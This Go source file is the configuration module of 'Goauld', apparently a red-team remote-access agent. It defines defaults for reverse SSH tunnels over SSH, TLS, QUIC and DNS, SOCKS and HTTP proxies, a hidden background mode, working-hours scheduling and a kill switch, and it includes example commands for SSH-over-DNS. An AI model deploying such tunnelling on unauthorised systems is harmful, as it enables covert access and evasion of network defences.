//go:build mini

package config

import (
	"Goauld/common"
	"Goauld/common/crypto"
	"Goauld/common/log"
	"Goauld/common/ssh"
	"crypto/md5"
	"fmt"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/alecthomas/kong"
	"github.com/keygen-sh/machineid"
)

var (
	_agePubKey = "age1uh8yak4wzucmg6f60hfjnvendarf55xumr4ttst0n0yjja9gnc0qu0sffj"

	_private_password = ""              //nolint:revive
	_password_cli     = ""              //nolint:revive
	_shared_password  = ""              //nolint:revive
	_name             = "user@hostname" //nolint:revive

	_server      = "127.0.0.1"
	_ssh_server  = "www.example.com:22222"      //nolint:revive
	_tls_server  = "app.example.com"            //nolint:revive
	_quic_domain = "app.example.com"            //nolint:revive
	_dns_server  = "tns.example.com,8.8.8.8,1.1.1.1,9.9.9.9" //nolint:revive
	_dns_domain  = "t.example.com"                           //nolint:revive

	_sshd_enabled           = "true" //nolint:revive
	_socks_enabled          = "true" //nolint:revive
	_http_proxy_enabled     = "true" //nolint:revive
	_socks_use_system_proxy = "true" //nolint:revive

	_proxy          = "http://localhost:8081"
	_proxy_username = "" //nolint:revive
	_proxy_password = "" //nolint:revive
	_proxy_domain   = "" //nolint:revive

	_socks_custom_proxy   = "" //nolint:revive
	_socks_proxy_username = "" //nolint:revive
	_socks_proxy_password = "" //nolint:revive
	_socks_proxy_domain   = "" //nolint:revive

	_http_custom_proxy   = "" //nolint:revive
	_http_proxy_username = "" //nolint:revive
	_http_proxy_password = "" //nolint:revive
	_http_proxy_domain   = "" //nolint:revive

	_no_proxy = "false" //nolint:revive

	_rssh_port  = "0" //nolint:revive
	_socks_port = "0" //nolint:revive
	_http_port  = "0" //nolint:revive

	_keepawake = "false"
	_keepalive = "20"
	_verbosity = "0"
	_quiet     = "false"

	_only_working_days    = "false"        //nolint:revive
	_working_day_start    = "8:00"         //nolint:revive
	_working_day_end      = "19:30"        //nolint:revive
	_working_day_timezone = "Europe/Paris" //nolint:revive

	_rssh_order   = "SSH,TLS,WS,HTTP,DNS" //nolint:revive
	_rssh_timeout = "60"                  //nolint:revive

	_remote_port_forwarding = "" //nolint:revive

	_max_retries = "0" //nolint:revive

	_version         = "false"
	_generate_config = "false" //nolint:revive
	_config_file     = ""      //nolint:revive

	_background        = "false"
	_hidden_background = "false" //nolint:revive

	_custom_dns_command = "" //nolint:revive

	_killswitch = "7"

	defaultValues = kong.Vars{
		"_agePubKey": _agePubKey,

		"_password_cli":    _password_cli,
		"_shared_password": _shared_password,
		"_name":            _name,

		"_sshd_enabled":           _sshd_enabled,
		"_socks_enabled":          _socks_enabled,
		"_http_proxy_enabled":     _http_proxy_enabled,
		"_socks_use_system_proxy": _socks_use_system_proxy,

		"_no_proxy":       _no_proxy,
		"_proxy":          _proxy,
		"_proxy_username": _proxy_username,
		"_proxy_password": _proxy_password,
		"_proxy_domain":   _proxy_domain,

		"_socks_custom_proxy":   _socks_custom_proxy,
		"_socks_proxy_username": _socks_proxy_username,
		"_socks_proxy_password": _socks_proxy_password,
		"_socks_proxy_domain":   _socks_proxy_domain,

		"_http_custom_proxy":   _http_custom_proxy,
		"_http_proxy_username": _http_proxy_username,
		"_http_proxy_password": _http_proxy_password,
		"_http_proxy_domain":   _http_proxy_domain,

		"_server":      _server,
		"_ssh_server":  _ssh_server,
		"_tls_server":  _tls_server,
		"_quic_domain": _quic_domain,
		"_dns_server":  _dns_server,
		"_dns_domain":  _dns_domain,

		"_rssh_port":  _rssh_port,
		"_socks_port": _socks_port,
		"_http_port":  _http_port,

		"_keepawake": _keepawake,
		"_keepalive": _keepalive,
		"_verbosity": _verbosity,
		"_quiet":     _quiet,

		"_only_working_days":    _only_working_days,
		"_working_day_start":    _working_day_start,
		"_working_day_end":      _working_day_end,
		"_working_day_timezone": _working_day_timezone,

		"_rssh_order":   _rssh_order,
		"_rssh_timeout": _rssh_timeout,

		"_remote_port_forwarding": _remote_port_forwarding,

		"_max_retries": _max_retries,

		"_version":         _version,
		"_generate_config": _generate_config,
		"_config_file":     _config_file,

		"_background":        _background,
		"_hidden_background": _hidden_background,

		"_custom_dns_command": _custom_dns_command,

		"_killswitch": _killswitch,

		"version": common.GetVersion(),
	}
)

var (
	description = "Agent used to initiate the connection to the agent." +
		"\nThe agent will try to load configuration from " + filepath.Join("$HOME", ".config", "goauld_agent.yaml") + "\n" +
		"\nAs well as goauld_agent.yaml on the current directory."
)

// AgentConfig the agent configuration.
type AgentConfig struct {
	AgePubKey string `default:"${_agePubKey}" name:"age-pubkey" yaml:"age-pubkey" short:"A" help:"Age public key associated to the server. The provided public key should match the server public key"`

	Server          string   `default:"${_server}" short:"s" name:"server" yaml:"server" optional:"" help:"The control HTTP server to connect to."`
	SSHServer       string   `default:"${_ssh_server}" short:"S" name:"ssh-server" yaml:"ssh-server" optional:"" help:"The SSH server to connect to when using direct SSH connections."`
	QuicServer      string   `default:"${_quic_domain}" short:"Q" name:"quic-domain" yaml:"quic-domain" optional:"" help:"The QUIC domain used to tunnel the traffic."`
	TLSServer       string   `default:"${_tls_server}" short:"T" name:"tls-server" yaml:"tls-server" optional:"" help:"The TLS server to connect to when using SSH over TLS connections."`
	DNSServer       []string `default:"${_dns_server}" short:"d" name:"dns-server" yaml:"dns-server" optional:"" help:"The DNS server to connect to when using SSH over DNS connections, the magic name 'system' will be replaced by the list of the system DNS servers."`
	DNSServerDomain string   `default:"${_dns_domain}" short:"N" name:"dns-domain" yaml:"dns-domain" optional:"" help:"The DNS domain used to tunnel the traffic."`

	LocalSSHPassword string `default:"${_shared_password}" short:"P" name:"shared-password" yaml:"shared-password" optional:"" hidden:"" help:"SSH password to access the agent. If no password is provided, a random password is automatically generated."`
	PrivatePassword  string `default:"${_password_cli}" short:"p" name:"password" optional:"" help:"SSH password to access the agent"`
	Name             string `default:"${_name}" name:"name" yaml:"name" optional:"" help:"Nice name to identify the agent. Defaults to 'user@hostname'"`

	Sshd  bool `default:"${_sshd_enabled}" name:"sshd" yaml:"sshd" optional:"" negatable:"" help:"Start the SSHD server."`
	Socks bool `default:"${_socks_enabled}" name:"socks" yaml:"socks" optional:"" negatable:"" help:"Start the Socks proxy server."`
	HTTP  bool `default:"${_http_proxy_enabled}" name:"http" yaml:"http" optional:"" negatable:"" help:"Start the HTTP proxy server."`

	Proxy         *url.URL `default:"${_proxy}" name:"proxy" yaml:"proxy" optional:"" help:"Use the provided proxy to connect the control server. If no proxy is provided, by default the agent will attempt to use the underlying proxy configured on the system"`
	ProxyUsername string   `default:"${_proxy_username}" name:"proxy-username" yaml:"proxy-username" optional:"" help:"Username to use with the proxy"`
	ProxyPassword string   `default:"${_proxy_password}" name:"proxy-password" yaml:"proxy-password" optional:"" help:"Password to use with the proxy"`
	ProxyDomain   string   `default:"${_proxy_domain}" name:"proxy-domain" yaml:"proxy-domain" optional:"" help:"Domain to use with the proxy"`

	SocksCustomProxy    *url.URL `default:"${_socks_custom_proxy}" name:"socks-custom-proxy" yaml:"socks-custom-proxy" optional:"" help:"Use the provided proxy to use within the socks proxy. If no proxy is provided, by default the agent will attempt to use the underlying proxy configured on the system"`
	SocksUseSystemProxy bool     `default:"${_socks_use_system_proxy}" name:"socks-proxy" yaml:"socks-proxy" optional:"" negatable:"" help:"Use the proxy of the underlying system if applicable for all requests going through the socks proxy."`
	SocksProxyUsername  string   `default:"${_socks_proxy_username}" name:"socks-proxy-username" yaml:"socks-proxy-username" optional:"" help:"Username to use with the socks http upstream proxy"`
	SocksProxyPassword  string   `default:"${_socks_proxy_password}" name:"socks-proxy-password" yaml:"socks-proxy-password" optional:"" help:"Password to use with the socks http upstream proxy"`
	SocksProxyDomain    string   `default:"${_socks_proxy_domain}" name:"socks-proxy-domain" yaml:"socks-proxy-domain" optional:"" help:"Domain to use with the socks http upstream proxy"`

	HTTPCustomProxy   *url.URL `default:"${_http_custom_proxy}" name:"http-custom-proxy" yaml:"http-custom-proxy" optional:"" help:"Use the provided proxy to use within the http proxy. If no proxy is provided, by default the agent will attempt to use the underlying proxy configured on the system"`
	HTTPProxyUsername string   `default:"${_http_proxy_username}" name:"http-proxy-username" yaml:"http-proxy-username" optional:"" help:"Username to use with the http upstream proxy"`
	HTTPProxyPassword string   `default:"${_http_proxy_password}" name:"http-proxy-password" yaml:"http-proxy-password" optional:"" help:"Password to use with the http upstream proxy"`
	HTTPProxyDomain   string   `default:"${_http_proxy_domain}" name:"http-proxy-domain" yaml:"http-proxy-domain" optional:"" help:"Domain to use with the http upstream proxy"`

	NoProxy bool `default:"${_no_proxy}" name:"no-proxy" yaml:"no-proxy" optional:"" help:"Do not use the system proxy."`

	RSSHPort      int `default:"${_rssh_port}" name:"rssh-port" yaml:"rssh-port" optional:"" help:"The remote SSH port to bind to on the server.  By default, the port is 0 meaning the port will be random on the server."`
	SocksPort     int `default:"${_socks_port}"  name:"socks-port" yaml:"socks-port" short:"D" optional:"" help:"The remote SOCKS proxy port to bind to on the server,  By default, the port is 0 meaning the port will be random on the server."`
	HTTPProxyPort int `default:"${_http_port}" name:"http-port" yaml:"http-port" short:"" optional:"" help:"The remote HTTP proxy port to bind to on the server,  By default, the port is 0 meaning the port will be random on the server."`

	KeepAwake bool `default:"${_keepawake}" name:"keep-awake" yaml:"keep-awake" optional:"" help:"Keep the system awake (try to prevent from sleep and lock screen)."`
	KeepAlive int  `default:"${_keepalive}" short:"K"  name:"keepalive" yaml:"keepalive" optional:"" help:"Seconds between two keepalive messages in seconds, reduce this value if the connection drops (0 => no keepalive)."`
	Verbose   int  `default:"${_verbosity}" name:"verbose" yaml:"verbose" short:"v" type:"counter" help:"Verbosity of the logs. Repeat -v to increase"`
	Quiet     bool `default:"${_quiet}" name:"quiet" yaml:"quiet"  short:"q" help:"Suppress all logs"`

	OnlyWorkingDays    bool   `default:"${_only_working_days}" name:"only-working-days" yaml:"only-working-days" optional:"" help:"Only working days."`
	WorkingDayStart    string `default:"${_working_day_start}" name:"working-day-start" yaml:"working-day-start" help:"Start time of working day in days."`
	WorkingDayEnd      string `default:"${_working_day_end}" name:"working-day-end" yaml:"working-day-end" help:"End time of working day in days."`
	WorkingDayTimeZone string `default:"${_working_day_timezone}" name:"working-day-timezone" yaml:"working-day-timezone" help:"Timezone of working day."`

	RSSHOrder  []string `default:"${_rssh_order}" short:"O" name:"rssh-order" yaml:"rssh-order" optional:"" help:"Order the SSH tunnels connection attempts."`
	SSHTimeout int      `default:"${_rssh_timeout}" name:"ssh-timeout" yaml:"ssh-timeout" help:"Timeout in second to wait for the SSH tunnel to become available (independent for each protocol attempt), 0 means wait indefinitely."`

	RemotePortForwarding []ssh.RemotePortForwarding `default:"${_remote_port_forwarding}" name:"rpf" yaml:"rpf"  short:"R" optional:"" help:"Ports to forward to the server (REMOTE_PORT[:LOCAL_IP]:LOCAL_PORT). If REMOTE_PORT is 0, the port will be randomly chosen on the server"`

	MaxRetries int `default:"${_max_retries}" name:"max-retries" yaml:"max-retries" short:"M" help:"Max retries connection attempts before giving up"`

	Version        bool   `default:"${_version}" name:"version" yaml:"version" short:"V" help:"Show version information"`
	GenerateConfig bool   `default:"${_generate_config}" name:"generate-config" yaml:"generate-config" help:"Generate configuration file based on the current options."`
	ConfigFile     string `default:"${_config_file}" name:"config-file" yaml:"config-file" optionnal:"" short:"c" help:"Configuration file to use."`

	Background       bool `name:"background" yaml:"background" short:"B" default:"${_background}" negatable:"" optional:"" help:"Start the agent in the background."`
	HiddenBackground bool `name:"hidden-background" yaml:"hidden-background" default:"${_hidden_background}" hidden:""  negatable:"" optional:"" help:"Start the agent in the background."`

	CustomDNSCommand string `default:"${_custom_dns_command}" name:"custom-dns-command" yaml:"custom-dns-command" help:"System command used to perform SSH over DNS when raw DNS queries are blocked. The provided command is responsible for performing the DNS query and returning the result as raw bytes.\n Powershell example: \"((Resolve-DnsName -Type TXT -Server 127.0.0.1 '%s')[0].Strings -join '\x00' -replace '\\s+', '\x00' -split '..' | ForEach-Object { [Convert]::ToByte($_,16) } )\"\n Linux example:\"dig +short +unknownformat -t TXT '%s' @127.0.0.1 | head -n1 | cut -d ' ' -f3- | tr -d ' '  | xxd -r -p\"."`

	KillSwitch int `default:"${_killswitch}" name:"kill-switch" yaml:"kill-switch" help:"Number of days to stay alive. Afterward, the agent will kill itself. (0 to disable the killswitch)"`
}

func InitAgent() {

	sshd, err := strconv.ParseBool(_sshd_enabled)
	if err != nil {
		fmt.Println("sshd", err)
	}
	socks, err := strconv.ParseBool(_socks_enabled)
	if err != nil {
		fmt.Println("socks", err)
	}

	http, err := strconv.ParseBool(_http_proxy_enabled)
	if err != nil {
		fmt.Println("http", err)
	}

	proxy, err := url.Parse(_proxy)
	if err != nil {
		fmt.Println("proxy", err)
	}

	socksProxy, err := url.Parse(_socks_custom_proxy)
	if err != nil {
		fmt.Println("socksProxy", err)
	}
	socksUseSystemProxy, err := strconv.ParseBool(_socks_use_system_proxy)
	if err != nil {
		fmt.Println("socksUseSystemProxy", err)
	}

	httpCustomProxy, err := url.Parse(_http_custom_proxy)
	if err != nil {
		fmt.Println("HttpCustomProxy", err)
	}

	noproxy, err := strconv.ParseBool(_no_proxy)
	if err != nil {
		fmt.Println("NoProxy", err)
	}

	rsshPort, err := strconv.Atoi(_rssh_port)
	if err != nil {
		fmt.Println("rsshPort", err)
	}

	socksPort, err := strconv.Atoi(_socks_port)
	if err != nil {
		fmt.Println("socksPort", err)
	}

	httpPort, err := strconv.Atoi(_http_port)
	if err != nil {
		fmt.Println("httpPort", err)
	}

	cfg := &AgentConfig{
		AgePubKey:            _agePubKey,
		Server:               _server,
		SSHServer:            _ssh_server,
		QuicServer:           _quic_domain,
		TLSServer:            _tls_server,
		DNSServer:            strings.Split(_dns_server, ","),
		DNSServerDomain:      _dns_domain,
		LocalSSHPassword:     _shared_password,
		PrivatePassword:      _password_cli,
		Name:                 _name,
		Sshd:                 sshd,
		Socks:                socks,
		HTTP:                 http,
		Proxy:                proxy,
		ProxyUsername:        _proxy_username,
		ProxyPassword:        _proxy_password,
		ProxyDomain:          _proxy_domain,
		SocksCustomProxy:     socksProxy,
		SocksUseSystemProxy:  socksUseSystemProxy,
		SocksProxyUsername:   _socks_proxy_username,
		SocksProxyPassword:   _socks_proxy_password,
		SocksProxyDomain:     _socks_proxy_domain,
		HTTPCustomProxy:      httpCustomProxy,
		HTTPProxyUsername:    _http_proxy_username,
		HTTPProxyPassword:    _http_proxy_password,
		HTTPProxyDomain:      _http_proxy_domain,
		NoProxy:              noproxy,
		RSSHPort:             rsshPort,
		SocksPort:            socksPort,
		HTTPProxyPort:        httpPort,
		KeepAwake:            false,
		KeepAlive:            0,
		Verbose:              0,
		Quiet:                false,
		OnlyWorkingDays:      false,
		WorkingDayStart:      _working_day_start,
		WorkingDayEnd:        _working_day_end,
		WorkingDayTimeZone:   _working_day_start,
		RSSHOrder:            strings.Split(_rssh_order, ","),
		SSHTimeout:           0,
		RemotePortForwarding: nil,
		MaxRetries:           0,
		Version:              false,
		GenerateConfig:       false,
		ConfigFile:           "",
		Background:           false,
		HiddenBackground:     false,
		CustomDNSCommand:     "",
		KillSwitch:           0,
	}

	sharedSecret, err := crypto.GeneratePassword(crypto.PasswordLength)
	if err != nil {
		log.Error().Msg(err.Error())
	}
	crypt, err := crypto.NewCryptor(sharedSecret)
	if err != nil {
		log.Error().Msg(err.Error())
	}

	// Generate the agent name if not provided
	if cfg.Name == "user@hostname" {
		var name string
		userName, err := user.Current()
		if err != nil {
			log.Error().Err(err).Msg("error getting current user")
			return
		}
		if strings.Contains(userName.Username, "\\") {
			parts := strings.Split(userName.Username, "\\")
			if parts[1] != "" {
				name = parts[1]
			} else {
				name = strings.ReplaceAll(userName.Username, "\\", "_")
			}
		} else {
			name = userName.Username
		}

		hostname, err := os.Hostname()
		if err != nil {
			log.Error().Err(err).Msg("error getting hostname")
		}
		cfg.Name = fmt.Sprintf("%s@%s", name, hostname)
	}

	// compute the agent ID used to identify it
	mid, err := machineid.ID()
	if err != nil {
		log.Warn().Err(err).Msg("error generating machineId, using random")
		log.Warn().Err(err).Msg("Multiple agents might run in parallel on the same host")
		mid = cfg.Name
	}
	//nolint:gosec
	id := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s-%s", mid, cfg.Name))))

	agent = &Agent{
		ID:                       id,
		SSHPrivateKey:            "",
		SharedSecret:             sharedSecret,
		Cryptor:                  crypt,
		cfg:                      cfg,
		IsStaticPasswordDynamic:  false,
		RemoteDynamicPortForward: nil,
		RemotePortForward:        nil,
		Platform:                 runtime.GOOS,
		Architecture:             runtime.GOARCH,
		Username:                 "",
		Hostname:                 "",
		IPs:                      nil,
		Path:                     "",
		UnChunkDone:              nil,
	}
}

func (agent *Agent) Env() []string {
	var env []string
	env = append(env, prefixEnv("AGE_PUBKEY", _agePubKey))
	env = append(env, prefixEnv("SERVER", _server))
	env = append(env, prefixEnv("SSH_SERVER", _ssh_server))
	env = append(env, prefixEnv("QUIC_DOMAIN", _quic_domain))
	env = append(env, prefixEnv("TLS_SERVER", _tls_server))
	env = append(env, prefixEnv("DNS_SERVER", _dns_server))
	env = append(env, prefixEnv("DNS_DOMAIN", _dns_domain))
	env = append(env, prefixEnv("PASSWORD", _password_cli))
	env = append(env, prefixEnv("NAME", _name))
	env = append(env, prefixEnv("SSHD", _sshd_enabled))
	env = append(env, prefixEnv("SOCKS", _socks_enabled))
	env = append(env, prefixEnv("HTTP", _http_proxy_enabled))
	env = append(env, prefixEnv("PROXY", _proxy))
	env = append(env, prefixEnv("PROXY_USERNAME", _proxy_username))
	env = append(env, prefixEnv("PROXY_PASSWORD", _proxy_password))
	env = append(env, prefixEnv("PROXY_DOMAIN", _proxy_domain))
	env = append(env, prefixEnv("SOCKS_CUSTOM_PROXY", _socks_custom_proxy))
	env = append(env, prefixEnv("SOCKS_PROXY", _socks_use_system_proxy))
	env = append(env, prefixEnv("SOCKS_PROXY_USERNAME", _socks_proxy_username))
	env = append(env, prefixEnv("SOCKS_PROXY_PASSWORD", _socks_proxy_password))
	env = append(env, prefixEnv("SOCKS_PROXY_DOMAIN", _socks_proxy_domain))
	env = append(env, prefixEnv("HTTP_CUSTOM_PROXY", _http_custom_proxy))
	env = append(env, prefixEnv("HTTP_PROXY_USERNAME", _http_proxy_username))
	env = append(env, prefixEnv("HTTP_PROXY_PASSWORD", _http_proxy_password))
	env = append(env, prefixEnv("HTTP_PROXY_DOMAIN", _http_proxy_domain))
	env = append(env, prefixEnv("NO_PROXY", _no_proxy))
	env = append(env, prefixEnv("RSSH_PORT", _rssh_port))
	env = append(env, prefixEnv("SOCKS_PORT", _socks_port))
	env = append(env, prefixEnv("HTTP_PORT", _http_port))
	env = append(env, prefixEnv("KEEP_AWAKE", _keepawake))
	env = append(env, prefixEnv("KEEPALIVE", _keepalive))
	env = append(env, prefixEnv("VERBOSE", _verbosity))
	env = append(env, prefixEnv("QUIET", _quiet))
	env = append(env, prefixEnv("ONLY_WORKING_DAYS", _only_working_days))
	env = append(env, prefixEnv("WORKING_DAY_START", _working_day_start))
	env = append(env, prefixEnv("WORKING_DAY_END", _working_day_end))
	env = append(env, prefixEnv("WORKING_DAY_TIMEZONE", _working_day_timezone))
	env = append(env, prefixEnv("RSSH_ORDER", _rssh_order))
	env = append(env, prefixEnv("SSH_TIMEOUT", _rssh_timeout))
	env = append(env, prefixEnv("RPF", _remote_port_forwarding))
	env = append(env, prefixEnv("MAX_RETRIES", _max_retries))
	env = append(env, prefixEnv("VERSION", _version))
	env = append(env, prefixEnv("GENERATE_CONFIG", _generate_config))
	env = append(env, prefixEnv("CONFIG_FILE", _config_file))
	env = append(env, prefixEnv("BACKGROUND", _background))
	env = append(env, prefixEnv("CUSTOM_DNS_COMMAND", _custom_dns_command))
	env = append(env, prefixEnv("KILL_SWITCH", _killswitch))
	return env
}

// prefixEnv adds the application name to the provided value and returns it
// as an environment variable.
func prefixEnv(name string, value string) string {
	return fmt.Sprintf("%s_%s=%s", strings.ToUpper(common.AppName()), strings.ToUpper(name), value)
}
